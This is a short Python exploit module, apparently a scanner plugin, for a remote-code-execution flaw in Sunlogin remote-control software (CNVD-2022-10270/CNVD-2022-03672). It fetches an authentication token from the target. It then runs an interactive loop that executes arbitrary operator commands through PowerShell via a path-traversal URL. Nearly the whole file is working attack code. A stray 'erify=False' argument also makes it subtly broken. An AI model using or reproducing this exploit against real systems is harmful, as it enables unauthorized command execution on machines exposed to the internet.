#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/sLBX7ZwdYTSayRR7raM_ow',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '向日葵RCE复现CNVD-2022-10270/CNVD-2022-03672',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/cgi-bin/rpc?action=verify-haras'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    # if res.status_code == 200 and "root:" in res.text:
    if re.search(r'_code.*?enabled.*?verify_string.*?code',res.text,re.S):
      ret['huixian'] = '请使用exp函数继续获取权限 > '+res.text
      res.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret


def exp(url):
  print('[+] 开始执行命令(输入exit退出)!')
  cookie = input('[+]请先输入verify_string值>')
  headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
        'cookie':cookie,
    }
  cmd = ''
  try:
    while cmd != 'exit':
      cmd = input('[+]输入命令 >')
      try:
        vurl = url + '/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+'+cmd
        resp = requests.get(vurl,headers=headers,erify=False,timeout=3)
        print(resp.text)
      except:
        print('[+] 执行超时，请检查是否成功?')
    return True
  except:
    return False